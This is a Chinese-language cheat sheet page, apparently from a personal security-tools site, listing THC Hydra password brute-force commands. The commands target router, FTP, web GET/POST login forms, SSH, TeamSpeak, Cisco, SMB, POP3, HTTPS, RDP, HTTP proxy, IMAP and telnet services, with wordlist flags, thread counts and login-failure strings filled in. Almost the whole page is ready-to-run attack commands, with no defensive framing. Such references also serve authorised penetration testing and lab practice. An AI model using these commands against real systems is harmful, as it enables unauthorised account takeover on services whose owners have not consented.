---
layout: default
---
# ![](../img/hj.jpg)hydra

hydra在线

路由

hydra -l haha -P 字典 http://192.168.1.1

## ![](../img/github14.png)破解ftp
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV

hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

## ![](../img/github15.png)get方式提交 破解web登录
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /web/

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /web/index.asp

## ![](../img/github16.png)破解ssh
hydra -l 用户名 -p 密码字典 -t 线程 -e ns ip ssh

hydra -l 用户名 -p 密码字典 -t 线程 -o save.log ip ssh

## ![](../img/github16.png)破解teamspeak
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

## ![](../img/github17.png)post方式提交 破解web登录
hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"

## ![](../img/github18.png)cisco
hydra -P pass.txt 192.168.1.229 cisco

hydra -m cloud -P pass.txt 192.168.1.229 cisco-enable

## ![](../img/github26.png)smb
hydra -l administrator -P pass.txt 192.168.0.141 smb

## ![](../img/github19.png)pop3
hydra -l muts -P pass.txt my.pop3.mail pop3

## ![](../img/github20.png)https
hydra -m /index.php -l muts -P pass.txt 192.168.0.12 https

## ![](../img/github21.png)rdp
hydra ip rdp -l administrator -P pass.txt -V

## ![](../img/github22.png)http-proxy
hydra -l admin -P pass.txt http-proxy://192.168.0.1

## ![](../img/github23.png)imap
hydra -L user.txt -p secret 192.168.0.1 imap PLAIN

hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN

## ![](../img/github24.png)telnet
hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V

## ![](../img/github25.png)http:
hydra -L list_user -P list_password 192.168.56.101 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed” -V
。。。。。。

__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./tools)
